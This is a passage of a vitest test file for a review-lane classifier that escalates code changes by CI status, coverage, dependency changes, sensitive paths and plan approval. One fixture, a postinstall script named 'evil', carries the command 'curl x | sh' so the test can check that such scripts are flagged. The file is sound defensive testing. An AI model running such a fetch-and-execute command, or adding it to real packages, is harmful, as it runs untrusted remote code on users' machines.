import type { Lane } from "@app/domain";
import { describe, expect, it } from "vitest";
import type { ClassifyResult, ReasonCode } from "../src/index.js";
import {
  addFiles,
  bump,
  type ClassifyInput,
  coverage,
  dependencies,
  diff,
  file,
  gateOf,
  green,
  greenContext,
  llm,
  mutate,
  mutation,
  plan,
  publicApi,
  raisedCodes,
  reasonFor,
  redGreen,
  replaceKind,
  run,
  sensitivePaths,
  setStatus,
  testRun,
  transform,
  withFiles,
  withItems,
  withoutKind,
} from "./helpers.js";

interface Case {
  name: string;
  input: () => ClassifyInput;
  computedLane: Lane;
  /** Defaults to computedLane (or 1 when shadow is true). */
  lane?: Lane;
  shadow?: boolean;
  blocked?: boolean;
  requiresHumanApproval?: boolean;
  includes?: ReasonCode[];
  excludes?: ReasonCode[];
  check?: (result: ClassifyResult) => void;
}

function verify(c: Case): void {
  const result = run(c.input());
  const why = `raised: ${JSON.stringify(raisedCodes(result))}`;
  expect(result.computedLane, why).toBe(c.computedLane);
  expect(result.lane, why).toBe(c.lane ?? (c.shadow ? 1 : c.computedLane));
  expect(result.shadow, why).toBe(c.shadow ?? false);
  expect(result.blocked, why).toBe(c.blocked ?? false);
  expect(result.requiresHumanApproval, why).toBe(c.requiresHumanApproval ?? false);
  const codes = result.reasons.map((r) => r.code);
  for (const code of c.includes ?? []) expect(codes, why).toContain(code);
  for (const code of c.excludes ?? []) expect(codes, why).not.toContain(code);
  c.check?.(result);
}

function table(title: string, cases: Case[]): void {
  describe(title, () => {
    it.each(cases.map((c) => [c.name, c] as const))("%s", (_name, c) => verify(c));
  });
}

// ---------------------------------------------------------------- fixtures used by several tables

/** A docs-only change (no source files): skipped public-api/coverage are acceptable. */
function docsOnly(): ClassifyInput {
  return mutate(
    withFiles(green(), [file("README.md", 5, 1), file("docs/guide.md", 20, 3)]),
    (d) => {
      d.change.category = "docs";
      d.plan = plan({ scopePaths: ["README.md", "docs/**"] });
    },
  );
}

/** A mechanically pure dependency patch with no plan; planless only when the policy allows it. */
function dependencyPatch(planless = true): ClassifyInput {
  return mutate(
    replaceKind(
      withFiles(green(), [file("package.json", 1, 1), file("pnpm-lock.yaml", 6, 6)]),
      "dependencies",
      dependencies({ changed: [bump("left-pad", "patch")], lockfileChanged: true }),
    ),
    (d) => {
      d.plan = null;
      d.change.category = "dependency";
      d.policy.planlessLane0 = planless ? ["dependency-patch"] : [];
    },
  );
}

const RENAMED = ["src/users/a.ts", "src/users/b.ts", "src/users/c.ts"];

/** A claimed transform whose files are all reproduced by a verified transform. */
function verifiedTransform(): ClassifyInput {
  return mutate(
    withItems(
      withFiles(
        green(),
        RENAMED.map((p) => file(p, 3, 3)),
      ),
      transform(RENAMED),
    ),
    (d) => {
      d.change.category = "transform";
    },
  );
}

/** A verified pure revert with no plan, in shadow mode (lane0Enabled: false). */
function verifiedRevert(): ClassifyInput {
  return mutate(
    withoutKind(
      withFiles(green(), [file("src/slugify.ts", 1, 4), file("test/slugify.test.ts", 0, 14)]),
      "red-green",
    ),
    (d) => {
      d.plan = null;
      d.change.category = "revert";
      d.policy.lane0Enabled = false;
      d.context.pureRevertVerified = true;
    },
  );
}

// ---------------------------------------------------------------- tables

table("baseline", [
  {
    name: "fully green input is Lane 0",
    input: green,
    computedLane: 0,
    includes: [
      "ci.passed",
      "evidence.verified",
      "tests.passed",
      "red-green.proven",
      "api.none",
      "dependency.none",
      "sensitive.none",
      "migration.none",
      "policy.unchanged",
      "plan.approved",
      "scope.within",
      "size.ok",
      "coverage.ok",
      "mutation.ok",
      "transform.not-applicable",
      "llm.none",
      "informational.ok",
      "budget.ok",
      "tour.ok",
      "lane0.enabled",
    ],
    check: (r) => {
      expect(r.reasons.every((x) => x.lane === 0)).toBe(true);
      expect(r.checklist.every((c) => c.passed === true)).toBe(true);
    },
  },
]);

table("unknown → escalate: required signals missing (Lane 2)", [
  ...(["test-run", "public-api", "dependencies", "sensitive-paths", "red-green"] as const).map(
    (kind): Case => ({
      name: `no ${kind} item`,
      input: () => withoutKind(green(), kind),
      computedLane: 2,
      includes: [`signal.missing.${kind}` as ReasonCode],
      check: (r) => expect(gateOf(r, kind === "test-run" ? "tests" : kind).passed).toBeNull(),
    }),
  ),
  {
    name: "evidence is null: every required signal and gate is reported missing",
    input: () => mutate(green(), (d) => (d.evidence = null)),
    computedLane: 2,
    includes: [
      "signal.missing.evidence",
      "signal.missing.test-run",
      "signal.missing.public-api",
      "signal.missing.dependencies",
      "signal.missing.sensitive-paths",
      "signal.missing.red-green",
      "signal.missing.coverage",
      "signal.missing.mutation",
    ],
    excludes: ["evidence.unverified", "evidence.verified"],
  },
  {
    name: "diffStats is null: size/scope/migration/policy unknown, human approval required",
    input: () => mutate(green(), (d) => (d.diffStats = null)),
    computedLane: 2,
    requiresHumanApproval: true,
    includes: ["signal.missing.diff-stats"],
    excludes: ["size.ok", "scope.within", "migration.none", "policy.unchanged"],
    check: (r) => {
      for (const g of ["size", "scope", "migrations", "policy-file"] as const)
        expect(gateOf(r, g).passed).toBeNull();
    },
  },
  {
    name: "public-api skipped while source files changed counts as missing",
    input: () => setStatus(green(), "public-api", "skipped", "no TS packages"),
    computedLane: 2,
    includes: ["signal.missing.public-api"],
    excludes: ["signal.skip-accepted.public-api"],
    check: (r) =>
      expect(reasonFor(r, "signal.missing.public-api")?.message).toContain(
        "skipped: no TS packages",
      ),
  },
  {
    name: "test-run skipped counts as missing",
    input: () => setStatus(green(), "test-run", "skipped"),
    computedLane: 2,
    includes: ["signal.missing.test-run"],
  },
  {
    name: "dependencies skipped counts as missing (even on a docs-only diff)",
    input: () => setStatus(docsOnly(), "dependencies", "skipped"),
    computedLane: 2,
    includes: ["signal.missing.dependencies"],
  },
  {
    name: "sensitive-paths skipped counts as missing",
    input: () => setStatus(green(), "sensitive-paths", "skipped"),
    computedLane: 2,
    includes: ["signal.missing.sensitive-paths"],
  },
  {
    name: "red-green skipped on a claimed fix counts as missing",
    input: () => setStatus(green(), "red-green", "skipped"),
    computedLane: 2,
    includes: ["signal.missing.red-green"],
  },
]);

table("unknown → escalate: required signals errored (Lane 2)", [
  ...(["test-run", "public-api", "dependencies", "sensitive-paths", "red-green"] as const).map(
    (kind): Case => ({
      name: `${kind} errored`,
      input: () => setStatus(green(), kind, "error", "tool crashed"),
      computedLane: 2,
      includes: [`signal.error.${kind}` as ReasonCode],
      check: (r) => {
        const reason = reasonFor(r, `signal.error.${kind}` as ReasonCode);
        expect(reason?.message).toContain("tool crashed");
        expect(reason?.evidenceRef).toBeDefined();
      },
    }),
  ),
  {
    name: "one errored test run among ok runs still escalates",
    input: () => withItems(green(), testRun({ id: "test-run:e2e", step: "e2e", status: "error" })),
    computedLane: 2,
    includes: ["signal.error.test-run", "tests.passed"],
  },
  {
    name: "a skipped test run next to an ok one is fine",
    input: () =>
      withItems(green(), testRun({ id: "test-run:e2e", step: "e2e", status: "skipped" })),
    computedLane: 0,
  },
]);

table("unknown → escalate: CI and attestation", [
  {
    name: "CI failed → Lane 2 and blocked",
    input: () => mutate(green(), (d) => (d.context.ciStatus = "failed")),
    computedLane: 2,
    blocked: true,
    includes: ["ci.failed"],
  },
  {
    name: "CI errored → Lane 2, not blocked",
    input: () => mutate(green(), (d) => (d.context.ciStatus = "errored")),
    computedLane: 2,
    includes: ["ci.errored"],
  },
  {
    name: "CI cancelled → Lane 2",
    input: () => mutate(green(), (d) => (d.context.ciStatus = "cancelled")),
    computedLane: 2,
    includes: ["ci.cancelled"],
  },
  {
    name: "CI unknown → Lane 2",
    input: () => mutate(green(), (d) => (d.context.ciStatus = "unknown")),
    computedLane: 2,
    includes: ["ci.unknown"],
    check: (r) => expect(gateOf(r, "ci").passed).toBeNull(),
  },
  {
    name: "evidence attestation unverified → Lane 2 and blocked",
    input: () => mutate(green(), (d) => (d.context.evidenceVerified = false)),
    computedLane: 2,
    blocked: true,
    includes: ["evidence.unverified"],
    check: (r) => expect(gateOf(r, "evidence").passed).toBe(false),
  },
  {
    name: "test run reports failures although CI passed → Lane 2",
    input: () =>
      replaceKind(
        green(),
        "test-run",
        testRun({ failed: 2, failures: [{ name: "x", message: "boom" }] }),
      ),
    computedLane: 2,
    includes: ["tests.failing"],
    excludes: ["tests.passed"],
  },
]);

table("Lane-0 gates: coverage and mutation (Lane 1)", [
  {
    name: "coverage missing",
    input: () => withoutKind(green(), "coverage"),
    computedLane: 1,
    includes: ["signal.missing.coverage"],
  },
  {
    name: "coverage errored",
    input: () => setStatus(green(), "coverage", "error"),
    computedLane: 1,
    includes: ["signal.error.coverage"],
  },
  {
    name: "coverage below threshold",
    input: () => replaceKind(green(), "coverage", coverage(0.5)),
    computedLane: 1,
    includes: ["coverage.below-threshold"],
    check: (r) => {
      expect(reasonFor(r, "coverage.below-threshold")?.message).toBe(
        "Changed-line coverage 50.0% is below the threshold of 80.0%.",
      );
      expect(gateOf(r, "coverage").passed).toBe(false);
    },
  },
  {
    name: "coverage exactly at threshold passes",
    input: () => replaceKind(green(), "coverage", coverage(0.8)),
    computedLane: 0,
    includes: ["coverage.ok"],
  },
  {
    name: "coverage ratio that contradicts its own counts is read pessimistically",
    input: () =>
      replaceKind(
        green(),
        "coverage",
        coverage(0.9, { changedLines: 20, coveredChangedLines: 10 }),
      ),
    computedLane: 1,
    includes: ["coverage.below-threshold"],
  },
  {
    name: "lowest of several coverage items wins",
    input: () => withItems(green(), coverage(0.5, { id: "coverage:pkg-b" })),
    computedLane: 1,
    includes: ["coverage.below-threshold"],
  },
  {
    name: "coverage skipped with source changes counts as missing",
    input: () => setStatus(green(), "coverage", "skipped"),
    computedLane: 1,
    includes: ["signal.missing.coverage"],
  },
  {
    name: "mutation missing",
    input: () => withoutKind(green(), "mutation"),
    computedLane: 1,
    includes: ["signal.missing.mutation"],
  },
  {
    name: "mutation errored",
    input: () => setStatus(green(), "mutation", "error"),
    computedLane: 1,
    includes: ["signal.error.mutation"],
  },
  {
    name: "mutation below threshold",
    input: () => replaceKind(green(), "mutation", mutation(0.3)),
    computedLane: 1,
    includes: ["mutation.below-threshold"],
  },
  {
    name: "mutation exactly at threshold passes",
    input: () => replaceKind(green(), "mutation", mutation(0.6)),
    computedLane: 0,
    includes: ["mutation.ok"],
  },
  {
    name: "mutation score that contradicts its own counts is read pessimistically",
    input: () => replaceKind(green(), "mutation", mutation(0.9, { killed: 2, survived: 18 })),
    computedLane: 1,
    includes: ["mutation.below-threshold"],
  },
  {
    name: "mutation skipped (even docs-only) counts as missing",
    input: () => setStatus(docsOnly(), "mutation", "skipped"),
    computedLane: 1,
    includes: ["signal.missing.mutation"],
  },
]);

table("accepted skips: public-api and coverage on a docs-only diff", [
  {
    name: "public-api and coverage skipped, only docs changed → Lane 0",
    input: () =>
      setStatus(
        setStatus(docsOnly(), "public-api", "skipped", "no TS packages"),
        "coverage",
        "skipped",
        "no executable lines",
      ),
    computedLane: 0,
    includes: [
      "signal.skip-accepted.public-api",
      "signal.skip-accepted.coverage",
      "red-green.not-required",
    ],
    check: (r) =>
      expect(reasonFor(r, "signal.skip-accepted.public-api")?.message).toContain("no TS packages"),
  },
  {
    name: "a non-allow-listed file (SVG) makes the skip unacceptable",
    input: () =>
      setStatus(addFiles(docsOnly(), file("docs/diagram.svg", 10, 0)), "public-api", "skipped"),
    computedLane: 2,
    includes: ["signal.missing.public-api"],
  },
  {
    name: "a skip with unknown diffStats is never accepted",
    input: () => mutate(setStatus(docsOnly(), "coverage", "skipped"), (d) => (d.diffStats = null)),
    computedLane: 2,
    requiresHumanApproval: true,
    includes: ["signal.missing.coverage"],
    excludes: ["signal.skip-accepted.coverage"],
  },
]);

table("Lane 2 triggers", [
  {
    name: "breaking public API",
    input: () => replaceKind(green(), "public-api", publicApi("breaking")),
    computedLane: 2,
    includes: ["api.breaking"],
    check: (r) => expect(reasonFor(r, "api.breaking")?.message).toContain("slugs:slugify"),
  },
  {
    name: "sensitive hit reported by evidence",
    input: () =>
      replaceKind(
        addFiles(green(), file("src/auth/session.ts", 2, 1)),
        "sensitive-paths",
        sensitivePaths([{ path: "src/auth/session.ts", pattern: "**/auth/**" }]),
      ),
    computedLane: 2,
    includes: ["sensitive.hit"],
  },
  {
    name: "sensitive hit missed by evidence is caught against the BASE policy",
    input: () => addFiles(green(), file("src/auth/session.ts", 2, 1)),
    computedLane: 2,
    includes: ["sensitive.hit"],
    check: (r) =>
      expect(reasonFor(r, "sensitive.hit")?.message).toContain("src/auth/session.ts (**/auth/**)"),
  },
  {
    name: "base policy's own sensitive globs apply (evidence computed with other patterns)",
    input: () => mutate(green(), (d) => (d.policy.sensitivePaths = ["src/slugify.ts"])),
    computedLane: 2,
    includes: ["sensitive.hit"],
  },
  {
    name: "renaming a file OUT of a sensitive directory is a sensitive hit",
    input: () =>
      withFiles(green(), [
        file("src/session.ts", 0, 0, { status: "renamed", previousPath: "src/auth/session.ts" }),
        file("test/slugify.test.ts", 3, 0),
      ]),
    computedLane: 2,
    includes: ["sensitive.hit"],
  },
  {
    name: "migration file → both migration.touched and sensitive.hit",
    input: () =>
      addFiles(green(), file("src/db/migrations/0002_users.sql", 12, 0, { status: "added" })),
    computedLane: 2,
    includes: ["migration.touched", "sensitive.hit"],
  },
  {
    name: "migration file even when the policy has no sensitive globs",
    input: () =>
      mutate(
        addFiles(green(), file("src/migrations/0002.ts", 12, 0)),
        (d) => (d.policy.sensitivePaths = []),
      ),
    computedLane: 2,
    includes: ["migration.touched"],
    excludes: ["sensitive.hit"],
  },
  {
    name: "dependency added",
    input: () =>
      replaceKind(
        green(),
        "dependencies",
        dependencies({
          added: [{ name: "dayjs", version: "1.11.13", dev: false, manifest: "package.json" }],
          lockfileChanged: true,
        }),
      ),
    computedLane: 2,
    includes: ["dependency.added"],
    excludes: ["dependency.lockfile-only"],
  },
  {
    name: "major bump",
    input: () =>
      replaceKind(green(), "dependencies", dependencies({ changed: [bump("zod", "major")] })),
    computedLane: 2,
    includes: ["dependency.major"],
  },
  {
    name: "'other' bump",
    input: () =>
      replaceKind(green(), "dependencies", dependencies({ changed: [bump("x", "other")] })),
    computedLane: 2,
    includes: ["dependency.other-bump"],
  },
  {
    name: "new install script",
    input: () =>
      replaceKind(
        green(),
        "dependencies",
        dependencies({
          newInstallScripts: [{ name: "evil", script: "postinstall", command: "curl x | sh" }],
        }),
      ),
    computedLane: 2,
    includes: ["dependency.install-script"],
    excludes: ["dependency.none"],
  },
  {
    name: "claimed fix, red-green not-proven",
    input: () => replaceKind(green(), "red-green", redGreen("not-proven")),
    computedLane: 2,
    includes: ["red-green.not-proven"],
    check: (r) => expect(gateOf(r, "red-green").passed).toBe(false),
  },
  {
    name: "claimed fix, red-green no-tests",
    input: () => replaceKind(green(), "red-green", redGreen("no-tests")),
    computedLane: 2,
    includes: ["red-green.no-tests"],
  },
  {
    name: "scope drift: file outside scopePaths",
    input: () => addFiles(green(), file("lib/other.ts", 3, 0)),
    computedLane: 2,
    includes: ["scope.drift"],
    excludes: ["scope.within"],
    check: (r) => expect(reasonFor(r, "scope.drift")?.message).toContain("lib/other.ts"),
  },
  {
    name: "scope drift via a rename source outside scope",
    input: () =>
      addFiles(
        green(),
        file("src/moved.ts", 0, 0, { status: "renamed", previousPath: "lib/moved.ts" }),
      ),
    computedLane: 2,
    includes: ["scope.drift"],
  },
  {
    name: "outOfScope glob entry matched",
    input: () => addFiles(green(), file("src/legacy/old.ts", 1, 1)),
    computedLane: 2,
    includes: ["scope.out-of-scope"],
    excludes: ["scope.within"],
  },
  {
    name: "outOfScope directory entry (contains '/') covers files below it",
    input: () =>
      mutate(
        addFiles(green(), file("src/vendor/x.ts", 1, 1)),
        (d) => (d.plan = plan({ outOfScope: ["src/vendor"] })),
      ),
    computedLane: 2,
    includes: ["scope.out-of-scope"],
  },
  {
    name: "policy file changed → Lane 2 + requiresHumanApproval",
    input: () =>
      mutate(addFiles(green(), file(".platform/policy.ts", 1, 1)), (d) =>
        d.plan?.scopePaths.push(".platform/**"),
      ),
    computedLane: 2,
    requiresHumanApproval: true,
    includes: ["policy.changed", "sensitive.hit"],
    excludes: ["scope.drift"],
  },
  {
    name: "anything under .platform/ counts as a policy change (even with no sensitive globs)",
    input: () =>
      mutate(
        addFiles(green(), file(".platform/ci.ts", 4, 0)),
        (d) => (d.policy.sensitivePaths = []),
      ),
    computedLane: 2,
    requiresHumanApproval: true,
    includes: ["policy.changed"],
  },
  {
    name: "lines over the Lane 1 limit",
    input: () => withFiles(green(), [file("src/slugify.ts", 500, 301)]),
    computedLane: 2,
    includes: ["size.lines-over-lane1"],
  },
  {
    name: "files over the Lane 1 limit",
    input: () =>
      withFiles(
        green(),
        Array.from({ length: 41 }, (_, i) => file(`src/f${i}.ts`, 1, 0)),
      ),
    computedLane: 2,
    includes: ["size.files-over-lane1"],
  },
  {
    name: "diff header totals larger than the per-file sum are trusted",
    input: () =>
      mutate(green(), (d) => {
        if (d.diffStats) d.diffStats.additions = 900;
      }),
    computedLane: 2,
    includes: ["size.lines-over-lane1"],
  },
  {
    name: "AI budget exceeded",
    input: () => mutate(green(), (d) => (d.context.budgetExceeded = true)),
    computedLane: 2,
    includes: ["budget.exceeded"],
  },
  {
    name: "tour generation failed",
    input: () => mutate(green(), (d) => (d.context.tourStatus = "failed")),
    computedLane: 2,
    includes: ["tour.failed"],
  },
  {
    name: "LLM judgment: concern",
    input: () => withItems(green(), llm("concern")),
    computedLane: 2,
    includes: ["llm.concern"],
  },
  {
    name: "claimed transform with mismatched files",
    input: () =>
      mutate(
        withItems(
          green(),
          transform(["src/slugify.ts"], { verified: false, mismatchedFiles: ["src/slugify.ts"] }),
        ),
        (d) => (d.change.category = "transform"),
      ),
    computedLane: 2,
    includes: ["transform.mismatch", "transform.unverified"],
  },
  {
    name: "mismatched transform on a non-transform claim still escalates",
    input: () =>
      withItems(
        green(),
        transform(["src/slugify.ts"], { verified: false, mismatchedFiles: ["src/slugify.ts"] }),
      ),
    computedLane: 2,
    includes: ["transform.mismatch"],
  },
  {
    name: "verified=true with mismatchedFiles is contradictory → mismatch, no size credit",
    input: () =>
      withItems(
        withFiles(green(), [file("src/slugify.ts", 400, 400), file("test/slugify.test.ts", 5, 0)]),
        transform(["src/slugify.ts"], { mismatchedFiles: ["src/slugify.ts"] }),
      ),
    computedLane: 2,
    includes: ["transform.mismatch", "size.lines-over-lane1"],
    excludes: ["transform.verified", "size.transform-excluded"],
  },
]);

table("Lane 1 triggers", [
  {
    name: "additive public API",
    input: () => replaceKind(green(), "public-api", publicApi("additive")),
    computedLane: 1,
    includes: ["api.additive"],
  },
  {
    name: "lines over the Lane 0 limit",
    input: () => withFiles(green(), [file("src/slugify.ts", 100, 60)]),
    computedLane: 1,
    includes: ["size.lines-over-lane0"],
  },
  {
    name: "lines exactly at the Lane 0 limit",
    input: () => withFiles(green(), [file("src/slugify.ts", 100, 50)]),
    computedLane: 0,
    includes: ["size.ok"],
  },
  {
    name: "files over the Lane 0 limit",
    input: () =>
      withFiles(
        green(),
        Array.from({ length: 9 }, (_, i) => file(`src/f${i}.ts`, 1, 0)),
      ),
    computedLane: 1,
    includes: ["size.files-over-lane0"],
  },
  {
    name: "no plan",
    input: () => mutate(green(), (d) => (d.plan = null)),
    computedLane: 1,
    includes: ["plan.missing", "scope.not-applicable"],
    check: (r) => expect(gateOf(r, "plan").passed).toBe(false),
  },
  ...(["draft", "superseded", "rejected"] as const).map(
    (status): Case => ({
      name: `plan ${status}`,
      input: () => mutate(green(), (d) => (d.plan = plan({ status }))),
      computedLane: 1,
      includes: ["plan.not-approved"],
      check: (r) =>
        expect(reasonFor(r, "plan.not-approved")?.message).toContain(`status is ${status}`),
    }),
  ),
  {
    name: "plan 'approved' without an approver",
    input: () => mutate(green(), (d) => (d.plan = plan({ approvedBy: null }))),
    computedLane: 1,
    includes: ["plan.not-approved"],
  },
  {
    name: "plan approved by its own author",
    input: () => mutate(green(), (d) => (d.plan = plan({ approvedBy: "agent-author" }))),
    computedLane: 1,
    includes: ["plan.not-approved"],
  },
  {
    name: "plan declares no scopePaths",
    input: () => mutate(green(), (d) => (d.plan = plan({ scopePaths: [] }))),
    computedLane: 1,
    includes: ["plan.scope-undeclared", "plan.approved"],
    check: (r) => expect(gateOf(r, "scope").passed).toBeNull(),
  },
  {
    name: "dependency removed",
    input: () =>
      replaceKind(
        green(),
        "dependencies",
        dependencies({
          removed: [{ name: "lodash", version: "4.17.21", dev: false, manifest: "package.json" }],
        }),
      ),
    computedLane: 1,
    includes: ["dependency.removed"],
  },
  {
    name: "minor bump",
    input: () =>
      replaceKind(green(), "dependencies", dependencies({ changed: [bump("zod", "minor")] })),
    computedLane: 1,
    includes: ["dependency.minor"],
  },
  {
    name: "prerelease bump",
    input: () =>
      replaceKind(green(), "dependencies", dependencies({ changed: [bump("zod", "prerelease")] })),
    computedLane: 1,
    includes: ["dependency.prerelease"],
  },
  {
    name: "patch bump allowed by policy",
    input: () =>
      replaceKind(green(), "dependencies", dependencies({ changed: [bump("zod", "patch")] })),
    computedLane: 0,
    includes: ["dependency.patch"],
  },
  {
    name: "patch bump when policy disallows patch bumps in Lane 0",
    input: () =>
      mutate(
        replaceKind(green(), "dependencies", dependencies({ changed: [bump("zod", "patch")] })),
        (d) => (d.policy.dependencies.allowPatchBumpsInLane0 = false),
      ),
    computedLane: 1,
    includes: ["dependency.patch-not-allowed"],
  },
  {
    name: "lockfile changed with no direct dependency change",
    input: () => replaceKind(green(), "dependencies", dependencies({ lockfileChanged: true })),
    computedLane: 1,
    includes: ["dependency.lockfile-only"],
  },
  ...(["preview", "screenshots", "agent-trace"] as const).map(
    (kind): Case => ({
      name: `informational ${kind} errored`,
      input: () => setStatus(green(), kind, "error"),
      computedLane: 1,
      includes: [`signal.error.${kind}` as ReasonCode],
      excludes: ["informational.ok"],
    }),
  ),
  {
    name: "informational signals absent → nothing",
    input: () =>
      withoutKind(withoutKind(withoutKind(green(), "preview"), "screenshots"), "agent-trace"),
    computedLane: 0,
    includes: ["informational.ok"],
  },
  {
    name: "informational signals skipped → nothing",
    input: () =>
      setStatus(
        setStatus(setStatus(green(), "preview", "skipped"), "screenshots", "skipped"),
        "agent-trace",
        "skipped",
      ),
    computedLane: 0,
  },
  {
    name: "LLM judgment: unsure",
    input: () => withItems(green(), llm("unsure")),
    computedLane: 1,
    includes: ["llm.unsure"],
  },
  {
    name: "LLM judgment errored",
    input: () => withItems(green(), llm("no-concern", { status: "error", note: "timeout" })),
    computedLane: 1,
    includes: ["signal.error.llm-judgment"],
    excludes: ["llm.no-concern"],
  },
  {
    name: "LLM judgment skipped → nothing",
    input: () => withItems(green(), llm("concern", { status: "skipped" })),
    computedLane: 0,
    includes: ["llm.none"],
    excludes: ["llm.concern"],
  },
  {
    name: "LLM judgment: no concern → stays Lane 0",
    input: () => withItems(green(), llm("no-concern")),
    computedLane: 0,
    includes: ["llm.no-concern"],
  },
  {
    name: "claimed transform without any transform item",
    input: () => mutate(green(), (d) => (d.change.category = "transform")),
    computedLane: 1,
    includes: ["transform.unverified"],
  },
  {
    name: "claimed transform whose item did not verify (no specific mismatches)",
    input: () =>
      mutate(
        withItems(green(), transform(["src/slugify.ts"], { verified: false })),
        (d) => (d.change.category = "transform"),
      ),
    computedLane: 1,
    includes: ["transform.unverified"],
    excludes: ["transform.mismatch"],
  },
  {
    name: "transform verification errored",
    input: () =>
      withItems(green(), transform(["src/slugify.ts"], { status: "error", note: "sandbox died" })),
    computedLane: 1,
    includes: ["signal.error.transform"],
  },
  {
    name: "red-green errored on a non-fix claim is an errored optional signal (Lane 1)",
    input: () =>
      mutate(setStatus(green(), "red-green", "error"), (d) => (d.change.category = "feature")),
    computedLane: 1,
    includes: ["signal.error.red-green", "red-green.not-required"],
    check: (r) => expect(reasonFor(r, "signal.error.red-green")?.lane).toBe(1),
  },
  {
    name: "red-green verdict is irrelevant when the claim is not a fix",
    input: () =>
      mutate(
        replaceKind(green(), "red-green", redGreen("not-proven")),
        (d) => (d.change.category = "feature"),
      ),
    computedLane: 0,
    includes: ["red-green.not-required"],
    excludes: ["red-green.not-proven"],
  },
]);

table("scope globs", [
  {
    name: "free-text outOfScope entries are not treated as globs",
    input: () =>
      mutate(
        addFiles(green(), file("src/billing.ts", 1, 1)),
        (d) => (d.plan = plan({ outOfScope: ["billing", "Do not touch the public API"] })),
      ),
    computedLane: 0,
  },
  {
    name: "a scopePath written as a directory covers files below it",
    input: () => mutate(green(), (d) => (d.plan = plan({ scopePaths: ["src", "test/"] }))),
    computedLane: 0,
    includes: ["scope.within"],
  },
  {
    name: "dotfiles match globs (dot: true)",
    input: () =>
      mutate(
        addFiles(green(), file("src/.env.example", 1, 0)),
        (d) => (d.plan = plan({ scopePaths: ["src/**", "test/**"] })),
      ),
    computedLane: 0,
    includes: ["scope.within"],
  },
  {
    name: "leading ./ in diff paths is normalised before matching",
    input: () =>
      withFiles(green(), [file("./src/slugify.ts", 6, 2), file("./src/auth/x.ts", 1, 0)]),
    computedLane: 2,
    includes: ["sensitive.hit"],
    excludes: ["scope.drift"],
  },
]);

table("shadow mode", [
  {
    name: "computed Lane 0 with lane0Enabled=false → routed to Lane 1, shadow",
    input: () => mutate(green(), (d) => (d.policy.lane0Enabled = false)),
    computedLane: 0,
    lane: 1,
    shadow: true,
    includes: ["shadow.lane0-disabled"],
    excludes: ["lane0.enabled"],
    check: (r) => {
      expect(r.reasons[0]?.code).toBe("shadow.lane0-disabled");
      expect(gateOf(r, "lane0-enabled").passed).toBe(false);
      expect(
        r.checklist.filter((c) => c.gate !== "lane0-enabled").every((c) => c.passed === true),
      ).toBe(true);
    },
  },
  {
    name: "computed Lane 1 with lane0Enabled=false is not shadow",
    input: () =>
      mutate(
        replaceKind(green(), "public-api", publicApi("additive")),
        (d) => (d.policy.lane0Enabled = false),
      ),
    computedLane: 1,
    excludes: ["shadow.lane0-disabled"],
  },
  {
    name: "lane0Enabled=true → Lane 0, no shadow",
    input: green,
    computedLane: 0,
    includes: ["lane0.enabled"],
    excludes: ["shadow.lane0-disabled"],
  },
]);

table("planless Lane 0 categories (mechanically verified)", [
  {
    name: "dependency-patch: manifest + lockfile, only patch bumps → Lane 0 without a plan",
    input: () => dependencyPatch(),
    computedLane: 0,
    includes: ["plan.planless", "dependency.patch", "scope.not-applicable"],
    excludes: ["plan.missing"],
    check: (r) => expect(reasonFor(r, "plan.planless")?.message).toContain("dependency-patch"),
  },
  {
    name: "dependency-patch not enabled in policy → plan.missing",
    input: () => dependencyPatch(false),
    computedLane: 1,
    includes: ["plan.missing"],
  },
  {
    name: "claimed 'dependency' with a minor bump is not a dependency-patch",
    input: () =>
      replaceKind(
        dependencyPatch(),
        "dependencies",
        dependencies({ changed: [bump("left-pad", "minor")], lockfileChanged: true }),
      ),
    computedLane: 1,
    includes: ["plan.missing", "dependency.minor"],
    excludes: ["plan.planless"],
  },
  {
    name: "claimed 'dependency' that also changes a source file is not a dependency-patch",
    input: () => addFiles(dependencyPatch(), file("src/slugify.ts", 1, 1)),
    computedLane: 1,
    includes: ["plan.missing"],
    excludes: ["plan.planless"],
  },
  {
    name: "package.json edits beyond the recorded bumps (e.g. scripts) are not a dependency-patch",
    input: () =>
      withFiles(dependencyPatch(), [file("package.json", 3, 3), file("pnpm-lock.yaml", 6, 6)]),
    computedLane: 1,
    includes: ["plan.missing"],
  },
  {
    name: "claimed 'dependency' with a new install script is Lane 2, not planless",
    input: () =>
      replaceKind(
        dependencyPatch(),
        "dependencies",
        dependencies({
          changed: [bump("left-pad", "patch")],
          newInstallScripts: [{ name: "left-pad", script: "postinstall", command: "node x" }],
        }),
      ),
    computedLane: 2,
    includes: ["dependency.install-script", "plan.missing"],
  },
  {
    name: "verified-transform: every file reproduced → Lane 0 without a plan",
    input: () =>
      mutate(verifiedTransform(), (d) => {
        d.plan = null;
        d.policy.planlessLane0 = ["verified-transform"];
      }),
    computedLane: 0,
    includes: ["plan.planless", "transform.verified"],
  },
  {
    name: "verified-transform with one hand-edited file → plan.missing",
    input: () =>
      mutate(addFiles(verifiedTransform(), file("src/users/d.ts", 1, 1)), (d) => {
        d.plan = null;
        d.policy.planlessLane0 = ["verified-transform"];
      }),
    computedLane: 1,
    includes: ["plan.missing"],
  },
  {
    name: "pure-revert (verified) → Lane 0 without a plan",
    input: () =>
      mutate(verifiedRevert(), (d) => {
        d.policy.lane0Enabled = true;
        d.policy.autoMergeVerifiedReverts = false;
        d.policy.planlessLane0 = ["pure-revert"];
      }),
    computedLane: 0,
    includes: ["plan.planless", "revert.verified"],
    excludes: ["revert.auto-merge"],
  },
  {
    name: "pure-revert planless still shadowed when auto-merge of reverts is off",
    input: () =>
      mutate(verifiedRevert(), (d) => {
        d.policy.autoMergeVerifiedReverts = false;
        d.policy.planlessLane0 = ["pure-revert"];
      }),
    computedLane: 0,
    shadow: true,
  },
  {
    name: "claimed revert that the platform did not verify gets no planless pass",
    input: () =>
      mutate(verifiedRevert(), (d) => {
        d.context.pureRevertVerified = false;
        d.policy.lane0Enabled = true;
        d.policy.planlessLane0 = ["pure-revert"];
      }),
    computedLane: 1,
    includes: ["plan.missing"],
    excludes: ["revert.verified"],
  },
]);

table("verified revert exception", [
  {
    name: "verified revert with no plan merges in Lane 0 even in shadow mode",
    input: verifiedRevert,
    computedLane: 0,
    lane: 0,
    includes: ["revert.verified", "revert.auto-merge", "revert.waived"],
    excludes: ["plan.missing", "shadow.lane0-disabled"],
    check: (r) => {
      expect(reasonFor(r, "revert.waived")?.message).toContain("plan.missing");
      expect(gateOf(r, "plan").passed).toBe(true);
      expect(gateOf(r, "lane0-enabled").passed).toBe(true);
    },
  },
  {
    name: "size reasons are waived for a verified revert",
    input: () =>
      withFiles(
        verifiedRevert(),
